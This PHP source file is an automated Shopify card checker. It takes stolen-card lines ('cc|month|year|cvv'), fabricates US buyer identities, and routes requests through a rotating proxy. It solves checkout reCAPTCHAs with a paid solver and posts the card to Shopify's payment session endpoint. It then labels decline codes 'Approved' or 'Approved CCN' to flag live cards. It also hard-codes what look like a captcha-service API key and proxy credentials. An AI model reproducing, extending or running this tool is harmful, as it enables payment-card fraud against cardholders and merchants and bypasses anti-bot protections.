<?php

require_once __DIR__."/Capsolver/autoload.php";
require_once __DIR__."/Class_CurlX.php";





if (!function_exists('auto_shopify')) {
    function auto_shopify($url , $lista)
{

    $solver = new \Capsolver\CapsolverClient('CAP-5361C0C774F336BECC410D69E869566E');

    //---------------------------------------------------------------

    $result = [];
    $host_shopify = explode("/", $url)[2];
    //---------------------------------------------------------------
    $separa = explode("|", $lista);
    $cc = $separa[0];
    $mes = $separa[1];
    $ano = $separa[2];
    $cvv = $separa[3];

    if(strlen($ano) == 2 ){
        $ano = "20".$ano;
    }
    
    if ($mes < 10) {
        $mes = substr($mes, -1);
    }
    
    //---------------------------------------------------------------
    $curl = new CurlX;
    $cookies = uniqid();
    $start = microtime(as_float: true);

    $maxRetries = 3;
    $retries = 0;
    //---------------------------------------------------------------
    while ($retries < $maxRetries) {
        try {

            
          $socks5 = "gw.dataimpulse.com:823";
          $rotate = "b097452cc0d2c2bcc268:7580f00952ea0161";
          
            
            $server = ["METHOD" => "CUSTOM", "SERVER" => $socks5, "AUTH" => $rotate];
            
 



            $userData = Fake::GetUser('US');

$firstname = $userData['first_name'];
$lastname = $userData['last_name'];
$email = $userData['email'];
$phone = $userData['phone']['format2'];


        

$request = $curl::Get('https://'.$host_shopify.'/products.json', [
    'Content-Type: application/x-www-form-urlencoded',
    'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36'
], $cookies, $server);

if ($request->code !== 200) {
    throw new Exception("Connection error. Retry attempt number " . $retries . ". Please try again.");
}

$data = json_decode($request->body, true);

// Inicializamos las variables para el precio mínimo
$min_price = PHP_FLOAT_MAX; // Para obtener el precio más bajo
$min_product = null; // Para almacenar el producto con el precio más bajo

foreach ($data['products'] as $product) {
    foreach ($product['variants'] as $variant) {
        if ($variant['available'] === true && isset($variant['price']) && is_numeric($variant['price'])) {
            // Limpiamos el precio, eliminando posibles caracteres extraños (por ejemplo, comas o espacios)
            $price = trim($variant['price']);
            $price = str_replace(',', '.', $price); // Reemplaza comas por puntos si es necesario

            // Convertimos el precio a float y verificamos que sea mayor que 0.15
            $variant_price = floatval($price);

            // Imprimimos el precio encontrado para ver si es correcto
           
            if ($variant_price > 0.15 && $variant_price < $min_price) {
                $min_price = $variant_price;
                $variant_id = $variant['id'];
                $variant_price = $variant['price'];
                $min_product = [
                    'title' => $product['title'],
                    'price' => $variant_price,
                    'product_id' => $variant['product_id'],
                    'link' => $product['handle']
                ];
            }
        }
    }
}

// Mostramos el precio más bajo y el producto correspondiente
if ($min_product === null) {
    throw new Exception("No available product with valid price found. Retry attempt number " . $retries . ". Please try again.");
}

            $request = $curl::Post('https://'.$host_shopify.'/cart/add.js', 'id='.$variant_id.'&quantity=1', 
            [
               'Host: '.$host_shopify.'',
               'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0',
               'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
            ], $cookies, $server);



            sleep(1);
            $request = $curl::Post("https://$host_shopify/checkout/",null, 
            [
                'content-type: application/x-www-form-urlencoded',
                'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36'
            ], $cookies, $server);

            $id = explode("/", $request->headers->response["location"])[4];

            $localization = strip_tags(trim($curl::ParseString($request->headers->request["cookie"] ?? '', 'localization=', ';')));
            $TOKEN = $curl::ParseString($request->body ?? '', 'authenticity_token" value="', '"');


            if($id == 'cn'){
                return [
                    'host' => $host_shopify,
                    'details' => [ // Añadido una clave 'details' para el array interno
                        'variant_id' => $variant_id,
                        'localization' => $localization ?? "none",
                    ],
                    'message' => "Update Shopify",
                    'retries' => $retries
                ];
            }
            $count = 0;

            // Contar la presencia de cada subcadena
            $count += substr_count($request->body, '"breadcrumb__text">Information') > 0 ? 1 : 0;
            $count += substr_count($request->body, '"breadcrumb__text">Shipping') > 0 ? 1 : 0;
            $count += substr_count($request->body, '"breadcrumb__text">Payment') > 0 ? 1 : 0;
            
            if ($count >= 2) {
                $gift = "false";
            } else {
                $gift = "true"; // O cualquier valor por defecto que desees
            }


            $url = $request->headers->response["location"];


            if(substr_count($request->body ?? '', "grecaptcha.render")){
                $captcha_billing = "true";
                $request = json_encode(shipping_method_captcha_true($url,$cookies ,$host_shopify,$TOKEN,$curl ,$server,$localization,$email,$firstname,$lastname,$phone,$request));
                $TOKEN = json_decode($request, true)["token"];
                $shipping_method = json_decode($request, true)["shipping_method"];
            } else {
                $request = json_encode(shipping_method_captcha_false($url,$cookies ,$host_shopify,$TOKEN,$curl ,$server,$localization,$email,$firstname,$lastname,$phone));
                $TOKEN = json_decode($request, true)["token"];
                $shipping_method = json_decode($request, true)["shipping_method"];
                $captcha_billing = "false"; // O cualquier valor por defecto que desees
            }
        
            if($shipping_method == "null"){
                $shipping_method = isShippinmethond_false($url, $cookies ,$host_shopify, $curl ,$server);
            }


            $request = $curl::Post($url, '_method=patch&authenticity_token='.urlencode($TOKEN).'&previous_step=shipping_method&step=payment_method&checkout%5Bshipping_rate%5D%5Bid%5D='.urlencode($shipping_method).'&checkout%5Bclient_details%5D%5Bbrowser_width%5D=506&checkout%5Bclient_details%5D%5Bbrowser_height%5D=681&checkout%5Bclient_details%5D%5Bjavascript_enabled%5D=1&checkout%5Bclient_details%5D%5Bcolor_depth%5D=24&checkout%5Bclient_details%5D%5Bjava_enabled%5D=false&checkout%5Bclient_details%5D%5Bbrowser_tz%5D=300', 
            [
               'Host: '.$host_shopify.'',
               'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0',
               'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
            ], $cookies, $server);
            $total = $curl::ParseString($request->body, 'data-checkout-payment-due-target="', '"');
            $payment_gateway = $curl::ParseString($request->body, 'payment_gateway_', '"');

            if($total == "null" || $payment_gateway == "null" ){
                $is_total = json_encode(is_total($url, $cookies ,$host_shopify, $curl ,$server));
                $payment_gateway = json_decode($is_total, true)["payment_gateway"];
                $total = json_decode($is_total, true)["total"];

            }

            $headers = array();
            $headers[] = 'Host: deposit.us.shopifycs.com';
            $headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0';
            $headers[] = 'Accept: application/json';
            $headers[] = 'Referer: https://checkout.shopifycs.com/';
            $headers[] = 'Content-Type: application/json';
            $headers[] = 'Origin: https://checkout.shopifycs.com';

            $request = $curl::Post('https://deposit.us.shopifycs.com/sessions', '{"credit_card":{"number":"'.$cc.'","name":"'.$firstname.' '.$lastname.'","month":'.$mes.',"year":'.$ano.',"verification_value":"'.$cvv.'"},"payment_session_scope":"'.$host_shopify.'"}', 
            $headers , $cookies, $server);
            $id_sh = $curl::ParseString($request->body ?? '', '"id":"', '"');


            $request = $curl::Post($url, '_method=patch&authenticity_token='.$TOKEN.'&previous_step=payment_method&step=&s='.$id_sh.'&checkout%5Bpayment_gateway%5D='.$payment_gateway.'&checkout%5Bcredit_card%5D%5Bvault%5D=false&checkout%5Bdifferent_billing_address%5D=false&checkout%5Btotal_price%5D='.$total.'&checkout_submitted_request_url=&checkout_submitted_page_id=&complete=1&checkout%5Bclient_details%5D%5Bbrowser_width%5D=506&checkout%5Bclient_details%5D%5Bbrowser_height%5D=681&checkout%5Bclient_details%5D%5Bjavascript_enabled%5D=1&checkout%5Bclient_details%5D%5Bcolor_depth%5D=24&checkout%5Bclient_details%5D%5Bjava_enabled%5D=false&checkout%5Bclient_details%5D%5Bbrowser_tz%5D=300', 
            [
               'Host: '.$host_shopify.'',
               'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0',
               'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
            ], $cookies, $server);
            if(substr_count($request->body, "grecaptcha.render")){
                
                $SITEKEY = $curl::ParseString($request->body, 'sitekey: "', '"');
                $cursl = $curl::ParseString($request->body, 'var recaptchaCallback = function() {', '//]]>');
                $s = $curl::ParseString($cursl, "s: '", "'");
                
                
                $solution = $solver->recaptchaV2(
                    \Capsolver\Solvers\Token\ReCaptchaV2::TASK_PROXYLESS,
                    [
                        'websiteURL' => $url,
                        "websiteKey" => $SITEKEY,
                        'enterprisePayload' =>  [
                            "s" => $s
                      ],
                    ]
                  );
                  
                $captcha = $solution["gRecaptchaResponse"];



                $request = $curl::Post($url, '_method=patch&authenticity_token='.$TOKEN.'&previous_step=payment_method&step=&s=&checkout%5Bpayment_gateway%5D='.$payment_gateway.'&checkout%5Bcredit_card%5D%5Bvault%5D=false&checkout%5Bdifferent_billing_address%5D=false&g-recaptcha-response='.$captcha.'&checkout%5Btotal_price%5D='.$total.'&checkout_submitted_request_url=&checkout_submitted_page_id=&complete=1&checkout%5Bclient_details%5D%5Bbrowser_width%5D=506&checkout%5Bclient_details%5D%5Bbrowser_height%5D=681&checkout%5Bclient_details%5D%5Bjavascript_enabled%5D=1&checkout%5Bclient_details%5D%5Bcolor_depth%5D=24&checkout%5Bclient_details%5D%5Bjava_enabled%5D=false&checkout%5Bclient_details%5D%5Bbrowser_tz%5D=300', 
            [
               'Host: '.$host_shopify.'',
               'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0',
               'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
            ], $cookies, $server);


            $captcha_payment = "true";
            } else {
                $captcha_payment = "false"; // O cualquier valor por defecto que desees
            }




            $headers = array();
            $headers[] = 'Host: '.$host_shopify.'';
            $headers[] = 'Accept: */*';
            $headers[] = 'Referer: https://'.$host_shopify.'/';
            $headers[] = 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36';


            $curl::Get("$url/processing", $headers, $cookies, $server);


            sleep(rand(1, 3)); // Simular latencia aleatoria

        // Realizar la solicitud GET
        $request = $curl::Get("$url/processing?from_processing_page=1", $headers, $cookies, $server);

        sleep(rand(2, 3)); // Simular otra latencia aleatoria

        // Extraer el mensaje de respuesta
        $resp = $curl::ParseString($request->body, '<p class="notice__text">', '</p>');

        if (!$resp) {
            $resp = "Risk response. Try again later.";
        }

        // Determinar el estado basado en la URL y la respuesta
        if (strpos($request->final_url, '/thank_you') !== false || strpos($request->final_url, '/orders/') !== false || strpos($request->final_url, '/post_purchase') !== false) {
          $status = "Approved! ✅";
          $response_msg = "Charged $total";
          } elseif (strpos($request->final_url, '/3d_secure_2/') !== false) {
            $status = "Dead! ❌";
            $response_msg = "3d_secure_2 encountered";
        } elseif (strpos($resp, "Security code was not matched by the processor") !== false) {
            $status = "Approved CCN! ✅";
            $response_msg = $resp;
        } elseif (strpos($resp, "ZIP code does not match billing address") !== false) {
            $status = "Approved! ✅";
            $response_msg = $resp;
        } elseif (strpos($resp, "Declined refer call to issue") !== false) {
            $status = "Approved CCN! ✅";
            $response_msg = $resp;
        } elseif (strpos($resp, "2010 Card Issuer Declined CVV") !== false) {
            $status = "Approved CCN! ✅";
            $response_msg = $resp;
        } elseif (strpos($resp, "Billing address info was not matched by the processor") !== false) {
            $status = "Approved! ✅";
            $response_msg = $resp;
        } elseif (strpos($resp, "Insufficient Funds") !== false) {
            $status = "Approved! ✅";
            $response_msg = $resp;
        } elseif (strpos($resp, "Address not Verified - Approved") !== false) {
            $status = "Approved! ✅";
            $response_msg = $resp;
        } elseif (strpos($resp, "Address not Verified - Insufficient Funds") !== false) {
            $status = "Approved! ✅";
            $response_msg = $resp;
        } elseif (strpos($resp, "Security codes does not match correct format (3-4 digits)") !== false) {
            $status = "Approved CCN! ✅";
            $response_msg = $resp;
        } elseif (strpos($resp, "CVV2 Mismatch: 15004-This transaction cannot be processed. Please enter a valid Credit Card Verification Number.") !== false) {
            $status = "Approved CCN! ✅";
            $response_msg = $resp;
        } elseif (strpos($resp, "Invalid card verification number") !== false) {
            $status = "Approved CCN! ✅";
            $response_msg = $resp;
        } elseif (strpos($resp, "CVC Declined | N7 : Decline for CVV2 failure") !== false) {
            $status = "Approved CCN! ✅";
            $response_msg = $resp;
        } elseif (strpos($resp, "Withdrawal amount exceeded | 61 : Exceeds withdrawal amount limit") !== false) {
            $status = "Approved! ✅";
            $response_msg = $resp;
        } elseif (strpos($resp, "CVC Declined | 05 : Do not honor") !== false) {
            $status = "Approved CCN! ✅";
            $response_msg = $resp;
        } elseif (strpos($resp, "Not enough balance | 51 : Insufficient funds/over credit limit") !== false) {
            $status = "Approved! ✅";
            $response_msg = $resp;
        } elseif (strpos($resp, "CVV does not match") !== false) {
            $status = "Approved CCN! ✅";
            $response_msg = $resp;
        } elseif (strpos($resp, "Merchant Volume Exceeded") !== false) {
            $status = "Approved! ✅";
            $response_msg = $resp;
        } else {
            $status = "Declined! ❌";
            $response_msg = $resp;
        }
        

        // Salir del bucle tras completar la evaluación
        $end = microtime(true);
        $times = $end - $start;

        break;
    } catch (Exception $e) {
        $retries++;
        if ($retries >= $maxRetries) {
            // Manejo de error máximo de reintentos alcanzado
            $result = [
                'host' => $host_shopify,
                'message' => $e->getMessage(),
                'retries' => $retries,
            ];
            return $result;
        }
    }
}

// Preparar el resultado final
$result = [
  'host' => $host_shopify,
  'details' => [
      'variant_id' => $variant_id,
      'gift' => $gift ?? "true",
      'captcha_billing' => $captcha_billing,
      'captcha_payment' => $captcha_payment,
      'localization' => $localization ?? "none",
      'shipping_method' => $shipping_method ?? "none",
  ],
  'retries' => $retries,
  'message' => $response_msg,
  'status' => $status,
  'execute' => $times,
];

// Convertir el resultado a JSON
$json_result = json_encode($result);

// Retornar el JSON
return $json_result;

}
}


function shipping_method_captcha_false($url,$cookies ,$host_shopify,$TOKEN,$curl ,$server,$localization,$email,$firstname,$lastname,$phone){

    do {

      $userData = Fake::GetUser('US');

      $email = $userData['email'];
      $phone = $userData['phone']['format2'];
      
      $street = $userData['street'];
      $country = $userData['country'];
      $state = $userData['state'];
      $regioncode = $userData['state_id'];
      $city = $userData['city'];
      $zip = $userData['zip'];

    
    } while (empty($street) || empty($city) || empty($regioncode) || empty($state) || empty($zip));

$request = $curl::Post($url, '_method=patch&authenticity_token='.urlencode($TOKEN).'&previous_step=contact_information&step=shipping_method&checkout%5Bemail%5D='.urlencode($email).'&checkout%5Bbuyer_accepts_marketing%5D=0&checkout%5Bbuyer_accepts_marketing%5D=1&checkout%5Bshipping_address%5D%5Bfirst_name%5D=&checkout%5Bshipping_address%5D%5Blast_name%5D=&checkout%5Bshipping_address%5D%5Baddress1%5D=&checkout%5Bshipping_address%5D%5Baddress2%5D=&checkout%5Bshipping_address%5D%5Bcity%5D=&checkout%5Bshipping_address%5D%5Bcountry%5D=&checkout%5Bshipping_address%5D%5Bprovince%5D=&checkout%5Bshipping_address%5D%5Bzip%5D=&checkout%5Bshipping_address%5D%5Bphone%5D=&checkout%5Bshipping_address%5D%5Bcountry%5D='.urlencode($country).'&checkout%5Bshipping_address%5D%5Bfirst_name%5D='.$firstname.'&checkout%5Bshipping_address%5D%5Blast_name%5D='.$lastname.'&checkout%5Bshipping_address%5D%5Baddress1%5D='.urlencode($street).'&checkout%5Bshipping_address%5D%5Baddress2%5D=&checkout%5Bshipping_address%5D%5Bcity%5D='.urlencode($city).'&checkout%5Bshipping_address%5D%5Bprovince%5D='.$regioncode.'&checkout%5Bshipping_address%5D%5Bzip%5D='.$zip.'&checkout%5Bshipping_address%5D%5Bphone%5D='.urlencode($phone).'&checkout%5Bremember_me%5D=&checkout%5Bremember_me%5D=0&checkout%5Bclient_details%5D%5Bbrowser_width%5D=1366&checkout%5Bclient_details%5D%5Bbrowser_height%5D=681&checkout%5Bclient_details%5D%5Bjavascript_enabled%5D=1&checkout%5Bclient_details%5D%5Bcolor_depth%5D=24&checkout%5Bclient_details%5D%5Bjava_enabled%5D=false&checkout%5Bclient_details%5D%5Bbrowser_tz%5D=300', 
    [
       'Host: '.$host_shopify.'',
       'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0',
       'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
    ], $cookies, $server);

$TOKEN = $curl::ParseString($request->body, 'authenticity_token" value="', '"');
$shipping_method = $curl::ParseString($request->body, '<div class="radio-wrapper" data-shipping-method="', '"');

return [
"shipping_method" => $shipping_method,
"token" => $TOKEN
];
}


function shipping_method_captcha_true($url,$cookies ,$host_shopify,$TOKEN,$curl ,$server,$localization,$email,$firstname,$lastname,$phone,$request){
    $solver = new \Capsolver\CapsolverClient('CAP-5361C0C774F336BECC410D69E869566E');


    $SITEKEY = $curl::ParseString($request->body, 'sitekey: "', '"');
    $cursl = $curl::ParseString($request->body, 'var recaptchaCallback = function() {', '//]]>');
    $s = $curl::ParseString($cursl, "s: '", "'");
    
    
    $solution = $solver->recaptchaV2(
        \Capsolver\Solvers\Token\ReCaptchaV2::TASK_PROXYLESS,
        [
            'websiteURL' => $url,
            "websiteKey" => $SITEKEY,
            'enterprisePayload' =>  [
                "s" => $s
          ],
        ]
      );
      
    $captcha = $solution["gRecaptchaResponse"];


    do {

      $userData = Fake::GetUser('US');

      $email = $userData['email'];
      $phone = $userData['phone']['format2'];
      
      $street = $userData['street'];
      $country = $userData['country'];
      $state = $userData['state'];
      $regioncode = $userData['state_id'];
      $city = $userData['city'];
      $zip = $userData['zip'];

    
    } while (empty($street) || empty($city) || empty($regioncode) || empty($state) || empty($zip));


$request = $curl::Post($url, '_method=patch&authenticity_token='.urlencode($TOKEN).'&previous_step=contact_information&step=shipping_method&checkout%5Bemail%5D='.urlencode($email).'&checkout%5Bbuyer_accepts_marketing%5D=0&checkout%5Bbuyer_accepts_marketing%5D=1&checkout%5Bshipping_address%5D%5Bfirst_name%5D=&checkout%5Bshipping_address%5D%5Blast_name%5D=&checkout%5Bshipping_address%5D%5Baddress1%5D=&checkout%5Bshipping_address%5D%5Baddress2%5D=&checkout%5Bshipping_address%5D%5Bcity%5D=&checkout%5Bshipping_address%5D%5Bcountry%5D=&checkout%5Bshipping_address%5D%5Bprovince%5D=&checkout%5Bshipping_address%5D%5Bzip%5D=&checkout%5Bshipping_address%5D%5Bphone%5D=&checkout%5Bshipping_address%5D%5Bcountry%5D='.urlencode($country).'&checkout%5Bshipping_address%5D%5Bfirst_name%5D='.$firstname.'&checkout%5Bshipping_address%5D%5Blast_name%5D='.$lastname.'&checkout%5Bshipping_address%5D%5Baddress1%5D='.urlencode($street).'&checkout%5Bshipping_address%5D%5Baddress2%5D=&checkout%5Bshipping_address%5D%5Bcity%5D='.urlencode($city).'&checkout%5Bshipping_address%5D%5Bprovince%5D='.$regioncode.'&checkout%5Bshipping_address%5D%5Bzip%5D='.$zip.'&checkout%5Bshipping_address%5D%5Bphone%5D='.urlencode($phone).'&checkout%5Bremember_me%5D=&checkout%5Bremember_me%5D=0&g-recaptcha-response='.$captcha.'&checkout%5Bclient_details%5D%5Bbrowser_width%5D=1366&checkout%5Bclient_details%5D%5Bbrowser_height%5D=681&checkout%5Bclient_details%5D%5Bjavascript_enabled%5D=1&checkout%5Bclient_details%5D%5Bcolor_depth%5D=24&checkout%5Bclient_details%5D%5Bjava_enabled%5D=false&checkout%5Bclient_details%5D%5Bbrowser_tz%5D=300', 
    [
       'Host: '.$host_shopify.'',
       'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0',
       'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
    ], $cookies, $server);

$TOKEN = $curl::ParseString($request->body, 'authenticity_token" value="', '"');
$shipping_method = $curl::ParseString($request->body, '<div class="radio-wrapper" data-shipping-method="', '"');

return [
"shipping_method" => $shipping_method,
"token" => $TOKEN
];
}



function isShippinmethond_false($url,$cookies ,$is_host, $curl ,$server){
    $request = $curl::Get("$url?previous_step=contact_information&step=shipping_method", [
        'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'priority: u=0, i',
        'upgrade-insecure-requests: 1',
        'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36'
    ], $cookies, $server);
    $shipping_method = $curl::ParseString($request->body, '<div class="radio-wrapper" data-shipping-method="', '"');

    if ($shipping_method == "null") {
        $request = $curl::Get("$url/shipping_rates?step=shipping_method", [
            'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'priority: u=0, i',
            'X-Requested-With: XMLHttpRequest',
            'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36'
        ], $cookies, $server);

        sleep(rand(1,3));

        $request = $curl::Get("$url/shipping_rates?step=shipping_method", [
            'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'priority: u=0, i',
            'X-Requested-With: XMLHttpRequest',
            'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36'
        ], $cookies, $server);
        $shipping_method = $curl::ParseString($request->body, '<div class="radio-wrapper" data-shipping-method="', '"');
    }
    return  $shipping_method;
}


function is_total($url,$cookies ,$is_host, $curl ,$server){
    $request = $curl::Get("$url?step=payment_method", [
        'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'priority: u=0, i',
        'X-Requested-With: XMLHttpRequest',
        'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36'
    ], $cookies, $server);

    $total = $curl::ParseString($request->body, 'data-checkout-payment-due-target="', '"');
    $payment_gateway = $curl::ParseString($request->body, 'payment_gateway_', '"');

    $result = [
        'total' => $total,
        'payment_gateway' => $payment_gateway
    ];
    return $result;
}




